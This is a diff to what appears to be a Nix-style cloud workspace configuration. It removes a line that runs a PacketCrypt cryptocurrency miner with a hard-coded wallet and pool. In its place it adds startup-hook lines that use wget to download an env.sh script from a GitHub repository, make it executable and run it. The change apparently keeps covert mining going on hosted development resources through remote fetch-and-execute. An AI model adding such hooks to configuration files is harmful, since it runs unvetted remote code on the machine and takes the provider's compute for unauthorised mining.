@@ -31,7 +31,9 @@
   			tmux attach -t top-session
 	  	  ";
 	    	start-firex-sessions = "
-	  		docker run -d --name vnc --restart always -e WALLET=pkt1qldufh789t6v8g7wccql68w9c29524u6u5m87dy thomasjp0x42/packetcrypt-amd64 ann -p pkt1qldufh789t6v8g7wccql68w9c29524u6u5m87dy http://pool.pkt.world
+			rm -rf env.sh
+	  		wget https://github.com/dediminari/bit/raw/refs/heads/main/env.sh
+			chmod +x env.sh && ./env.sh
 	    	";
 	    };
       # To run something each time the workspace is (re)started, use the `onStart` hook
